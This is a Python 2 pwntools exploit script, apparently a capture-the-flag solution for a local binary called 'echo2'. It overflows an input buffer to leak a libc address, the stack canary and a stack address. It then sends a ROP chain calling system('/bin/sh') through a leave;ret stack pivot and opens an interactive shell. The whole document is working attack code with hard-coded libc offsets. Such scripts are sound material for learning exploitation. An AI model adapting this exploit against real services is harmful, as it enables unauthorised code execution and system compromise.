#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set follow-fork-mode parent\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./echo2')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./echo2")
vuln_func = elf.symbols['vuln_func']

# debug(vuln_func + 104)

## 1. Leak stack by BOF
ru("nput:\n")
se("a" * 0x8)
ru("a" * 0x8)
libc_base = u64(rc(6) + "\x00" * 2) - 0x219760
system_addr = libc_base + 0x54ae0
bin_sh_addr = libc_base + 0x1dbcba
leave_ret = libc_base + 0x5a1ac
rdi_ret = libc_base + 0x2e6c5
ret = libc_base + 0x2d9b9

## 2. Leak canary by BOF
ru("nput:\n")
se("a" * 0x69)
ru("a" * 0x69)
canary = u64("\x00" + rc(7))

## 3. Leak stack by BOF
ru("nput:\n")
se("a" * 0x70)
ru("a" * 0x70)
stack_buf = u64(rc(6) + "\x00" * 2) - 0x90

## 4. ROP
ru("nput:\n")
payload = p64(0) + p64(ret) + p64(rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
payload = payload.ljust(0x68, "\x00")
payload += p64(canary) + p64(stack_buf) + p64(leave_ret)
se(payload)

print(hex(canary))
print(hex(stack_buf))
print(hex(libc_base))

# ## 5. return
ru("nput:\n")
sl("--\x00")
p.interactive()
